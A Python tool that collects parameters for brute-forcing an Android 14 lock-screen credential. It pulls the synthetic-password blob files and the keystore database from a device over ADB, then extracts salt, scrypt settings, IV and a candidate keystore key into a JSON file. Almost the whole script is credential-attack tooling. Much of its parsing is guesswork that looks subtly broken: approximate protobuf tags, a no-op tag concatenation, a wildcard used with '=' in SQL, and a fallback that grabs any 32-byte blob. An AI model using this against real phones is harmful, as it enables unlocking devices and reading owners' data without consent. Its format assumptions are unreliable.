#!/usr/bin/env python3
"""
extract_params.py - Extract brute-force parameters from Android 14 spblob + keystore.

Handles all files via ADB pull and manual mode.
"""

import struct
import sqlite3
import hashlib
import argparse
import json
import os
import sys
from pathlib import Path


def parse_pwd(pwd_path):
    """Parse .pwd file for salt + scrypt parameters."""
    with open(pwd_path, "rb") as f:
        raw = f.read()
    
    # PasswordData protobuf format (simplified parsing)
    # Looking for salt (16 bytes, tagged) and scrypt params (log values)
    salt = None
    scrypt_n, scrypt_r, scrypt_p = 2048, 8, 2
    
    # The .pwd file contains protobuf-encoded data
    # For Android 14, salt is typically at a fixed offset after the protobuf header
    # Try to find salt (16 consecutive non-zero bytes)
    pos = 0
    while pos < len(raw) - 16:
        chunk = raw[pos:pos+16]
        # Salt field often starts with byte marker, skip it
        if all(0x20 <= b <= 0x7e or b == 0x00 for b in chunk[:4]):
            pos += 1
            continue
        # Look for a 16-byte field that looks like random data (salt)
        unique = len(set(chunk))
        if unique > 10:  # High entropy -> likely salt
            # Check if this is preceded by a field tag (0x0a or 0x12)
            if pos > 0 and raw[pos-1] in (0x0a, 0x12):
                salt_len = raw[pos-2] if pos >= 2 else 0
                if salt_len == 16:
                    salt = chunk
                    # Also try to find scrypt params before/after
                    break
        pos += 1
    
    if salt is None:
        # Fallback: try common offsets
        # In many .pwd files, salt is at offset 18-20 with tag
        for offset in range(0, min(50, len(raw)-16)):
            if raw[offset] == 0x12 and offset+1 < len(raw) and raw[offset+1] == 16:
                salt = raw[offset+2:offset+18]
                break
            if raw[offset] == 0x0a and offset+1 < len(raw) and raw[offset+1] == 16:
                salt = raw[offset+2:offset+18]
                break
    
    # Search for scrypt parameter tags (varint encoded log values)
    # N tag ~= 0x18, r tag ~= 0x20, p tag ~= 0x28 (approximate)
    for offset in range(0, len(raw) - 3):
        tag = raw[offset]
        if tag == 0x18:  # scrypt N
            scrypt_n = 1 << raw[offset+1]  # 2^value
        elif tag == 0x20:  # scrypt r
            scrypt_r = 1 << raw[offset+1]
        elif tag == 0x28:  # scrypt p
            scrypt_p = 1 << raw[offset+1]
    
    return {
        "salt_hex": salt.hex() if salt else "UNKNOWN",
        "scrypt_n": scrypt_n,
        "scrypt_r": scrypt_r,
        "scrypt_p": scrypt_p,
        "pwd_raw_size": len(raw)
    }


def parse_secdis(secdis_path):
    """Hash the secdiscardable file (16KB random data)."""
    with open(secdis_path, "rb") as f:
        data = f.read()
    return {
        "sec_hash_hex": hashlib.sha512(data).hexdigest(),
        "secdis_size": len(data)
    }


def parse_spblob(spblob_path):
    """Parse the SP blob to extract IV and ciphertext layers."""
    with open(spblob_path, "rb") as f:
        data = f.read()
    
    # SP blob structure for Android 14:
    # First byte(s): version
    # Then: outer wrapped key (AES-GCM: 12B IV + variable CT + 16B tag)
    # Then: inner wrapped data (same format)
    
    version = data[0] if data else 0
    payload = data[1:] if len(data) > 1 else b""
    
    # Outer layer: 12-byte IV + ciphertext + 16-byte tag
    outer_iv = payload[:12]
    # The payload length after IV is the remaining minus 16 for the tag
    outer_ct = payload[12:]
    
    # The spblob might have multiple encrypted sections
    # Standard format: version(1) || outer(IV+CT+tag) || inner(IV+CT+tag)
    # Total outer section size depends on actual format
    
    result = {
        "spblob_size": len(data),
        "version": version,
    }
    
    if len(outer_iv) == 12:
        result["outer_iv_hex"] = outer_iv.hex()
        # The last 16 bytes of each encrypted section is the tag
        if len(outer_ct) >= 16:
            result["outer_ct_tag_hex"] = (outer_ct[:-16] + outer_ct[-16:]).hex()
    else:
        result["outer_iv_hex"] = "INVALID_SIZE"
    
    return result


def parse_keystore_db(db_path):
    """Extract AES master key from keystore persistent.sqlite."""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [r[0] for r in cursor.fetchall()]
        
        keystore_key = None
        
        if "keyentry" in tables and "blobentry" in tables:
            cursor.execute("""
                SELECT b.blob FROM keyentry k
                JOIN blobentry b ON k.id = b.id
                WHERE k.alias = 'USRSKEY_synthetic_password_%'
                OR k.alias LIKE '%synthetic_password%'
                ORDER BY k.id DESC LIMIT 1
            """)
            row = cursor.fetchone()
            if row:
                keystore_key = row[0][:32] if len(row[0]) >= 32 else row[0]
        
        if keystore_key is None:
            # Fallback: search all blobs for 32-byte key-like data
            cursor.execute("SELECT alias, blob FROM keyentry k JOIN blobentry b ON k.id = b.id")
            for alias, blob in cursor.fetchall():
                if "synthetic" in str(alias).lower() or "spblob" in str(alias).lower():
                    keystore_key = blob[:32] if len(blob) >= 32 else blob
                    break
        
        if keystore_key is None:
            # Last resort: look for any 32-byte key in blobentry
            cursor.execute("SELECT blob FROM blobentry LIMIT 20")
            for (blob,) in cursor.fetchall():
                if len(blob) >= 32:
                    keystore_key = blob[:32]
                    break
        
        return {
            "keystore_key_hex": keystore_key.hex() if keystore_key else "NOT_FOUND",
            "keystore_tables": tables
        }
    finally:
        conn.close()


def adb_pull(remote, local):
    """Pull file from device via ADB."""
    os.system(f"adb pull {remote} {local} 2>/dev/null")
    return os.path.exists(local)


def main():
    parser = argparse.ArgumentParser(description="Extract SP Blob brute-force parameters from Android 14")
    
    parser.add_argument("--adb", action="store_true", help="Auto-pull from connected device")
    parser.add_argument("--pwd", help="Path to .pwd file")
    parser.add_argument("--spblob", help="Path to .spblob file")
    parser.add_argument("--secdis", help="Path to .secdis file")
    parser.add_argument("--keystore-db", help="Path to persistent.sqlite")
    parser.add_argument("--protector-id", help="16-char hex protector ID")
    parser.add_argument("--output", default="params.json", help="Output JSON file")
    parser.add_argument("--outdir", default="spblob_data", help="Output directory for pulled files")
    
    args = parser.parse_args()
    
    os.makedirs(args.outdir, exist_ok=True)
    
    protector_id = args.protector_id
    
    if args.adb:
        if not protector_id:
            import subprocess
            result = subprocess.run(
                "adb shell dumpsys lock_settings | grep 'LSKF-based SP protector ID' | awk '{print $NF}'",
                shell=True, capture_output=True, text=True
            )
            protector_id = result.stdout.strip()
            if not protector_id:
                print("[-] Could not find protector ID. Please provide --protector-id manually.")
                sys.exit(1)
            print(f"[+] Protector ID: {protector_id}")
        
        for ext, local_name in [(".pwd", "pwd.bin"), (".spblob", "spblob.bin"),
                                (".secdis", "secdis.bin")]:
            remote = f"/data/system_de/0/spblob/{protector_id}{ext}"
            local = f"{args.outdir}/{local_name}"
            if adb_pull(remote, local):
                print(f"[+] Pulled {remote}")
        
        if adb_pull("/data/misc/keystore/persistent.sqlite", f"{args.outdir}/persistent.sqlite"):
            print(f"[+] Pulled persistent.sqlite")
        
        args.pwd = f"{args.outdir}/pwd.bin"
        args.spblob = f"{args.outdir}/spblob.bin"
        args.secdis = f"{args.outdir}/secdis.bin"
        args.keystore_db = f"{args.outdir}/persistent.sqlite"
    
    if not protector_id:
        protector_id = "UNKNOWN"
    
    params = {"protector_id": protector_id}
    
    if args.pwd and os.path.exists(args.pwd):
        params.update(parse_pwd(args.pwd))
        print(f"[+] Parsed .pwd: salt={params.get('salt_hex', '?')[:16]}..., "
              f"N={params.get('scrypt_n')}, r={params.get('scrypt_r')}, p={params.get('scrypt_p')}")
    
    if args.secdis and os.path.exists(args.secdis):
        params.update(parse_secdis(args.secdis))
        print(f"[+] Parsed .secdis: hash={params.get('sec_hash_hex', '?')[:16]}...")
    
    if args.spblob and os.path.exists(args.spblob):
        params.update(parse_spblob(args.spblob))
        print(f"[+] Parsed .spblob: version={params.get('version')}")
    
    if args.keystore_db and os.path.exists(args.keystore_db):
        kp = parse_keystore_db(args.keystore_db)
        params.update(kp)
        print(f"[+] Parsed keystore: key={params.get('keystore_key_hex', '?')[:16]}...")
    
    with open(args.output, "w") as f:
        json.dump(params, f, indent=2)
    
    print(f"\n[+] Parameters saved to {args.output}")
    return params


if __name__ == "__main__":
    main()
